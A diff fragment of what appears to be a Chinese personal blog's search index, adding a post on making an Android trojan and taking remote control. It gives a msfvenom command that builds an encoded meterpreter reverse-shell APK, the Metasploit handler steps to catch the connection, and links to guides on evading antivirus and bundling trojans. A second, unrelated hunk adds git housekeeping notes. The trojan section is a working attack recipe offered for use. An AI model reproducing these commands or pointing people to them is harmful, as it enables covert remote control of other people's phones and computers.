+<h3 id="安卓病毒-1"><a href="#安卓病毒-1" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom --platform Android -p android/meterpreter/reverse_tcp LHOST=服务器地址（域名） LPORT=隧道端口 -e x86/shikata_ga_nai R &gt; black_1.apk</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lhost 本地IP</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lport 本地端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程控制操作"><a href="#远程控制操作" class="headerlink" title="远程控制操作"></a>远程控制操作</h2><p><a href="https://uuzdaisuki.com/2020/08/04/meterpreter%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">meterpreter命令总结</a></p>
+<p><a href="https://www.cnblogs.com/yokan/p/12635066.html">https://www.cnblogs.com/yokan/p/12635066.html</a></p>
+<p><a href="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</a></p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/NuclearDalance/article/details/116450238">https://blog.csdn.net/NuclearDalance/article/details/116450238</a>	“使用Kali Linux系统生成木马病毒并实现远程控制计算机”<br>[2]: <a href="https://xz.aliyun.com/t/12893">https://xz.aliyun.com/t/12893</a>	“Android免杀小结”<br>[3]: <a href="https://cloud.tencent.com/developer/article/2245833">https://cloud.tencent.com/developer/article/2245833</a>	“使用Kali生成木马入侵安卓手机”</p>
+<p>[4]: <a href="https://bbs.kanxue.com/thread-254995.htm">https://bbs.kanxue.com/thread-254995.htm</a>	“[分享]免杀之安卓渗透”<br>[5]: <a href="https://blog.csdn.net/m0_46250064/article/details/105193234">https://blog.csdn.net/m0_46250064/article/details/105193234</a>	“让你自己制作的木马和病毒用360安全卫士杀不出。加壳，免杀，加花，捆绑，压缩。”</p>
 ]]></content>
       <categories>
         <category>信息安全</category>
@@ -3830,6 +4239,9 @@
 <li>代码实现</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git rm -r --cached .</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="放弃本次的修改"><a href="#放弃本次的修改" class="headerlink" title="放弃本次的修改"></a>放弃本次的修改</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>编程技能</category>
